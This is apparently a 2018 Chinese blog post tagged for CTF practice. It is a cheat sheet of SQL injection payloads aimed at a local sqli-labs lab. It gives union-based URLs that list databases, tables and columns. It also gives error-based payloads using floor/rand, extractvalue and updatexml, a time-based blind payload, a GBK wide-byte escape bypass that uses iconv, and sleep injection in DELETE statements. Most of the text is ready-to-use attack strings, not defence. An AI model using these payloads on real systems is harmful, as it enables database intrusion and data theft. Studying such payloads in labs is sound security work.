---
title: 常见sql注入语句
date: 2018-09-30 17:21:02
categories: PT
tags: [sql, ctf]
---
常见的SQL注入
<!--more-->
# 0x00 爆数据库下的库,表,列

**爆库**  

`http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select group_concat(schema_name),3 from information_schema.schemata -- +`   

**爆表**  

`http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'security' -- +`  

**爆字段**  

`http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,GROUP_CONCAT(column_name) from information_schema.columns where table_name='users' -- a`  

# 0x01 常见报错注入

- rand不能和order by一起用

`select * from users where id=1 and (select 1 from (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))a);`

`select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`


- extractvalue（）

`select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));  ` 

`select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));`

- 基于时间的SQL盲注

`slect ..... union select If(ascii(substr(database(),1,1))>115,0,sleep(5))`

# 0x02 宽字节注入

**判断方式：** 
1. 尝试
2. 页面编码是gbk

使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。  
宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\’，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击.  
宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码  
>%df%27--->(addslashes)--->%df%5c%27--->(GBK)---->運’ 
>
>用户输入---> 过滤函数--> 代码层的$sql-->mysql处理请求-->mysql中的sql  

为了避免宽字节注入，很多人使用iconv函数（能够完成各种字符集间的转换$text=iconv("UTF-8","GBK",$text);），其实这样做是有很大风险的，仍旧可以造成宽字节注入。  
可以使用逆向思维，先找一个gbk的汉字錦,錦的utf-8编码是0xe98ca6，它的gbk编码是0xe55c,是不是已经看出来了，当传入的值是錦'，'通过addslashes转义为'(%5c%27),錦通过icov转换为%e5%5c，终止变为了%e5%5c%5c%27,不难看出%5c%5c正好把反斜杠转义，使单引号逃逸，造成注入。  

iconv("utf-8","gbk","錦");编码转换  
echo bin2hex($t);输出字节码

# 0x03 delete
在一次delete语句的注入中，发现一个好玩的东西。  
delete语句拼接一些语句时.只有当表中存在数据时，如下语句才会执行：
```mysql
DELETE from dami_flash WHERE (id=3) or sleep(5);
DELETE from dami_flash WHERE (id=3) or (select sleep(5));
```


<br><br><br><br><br>
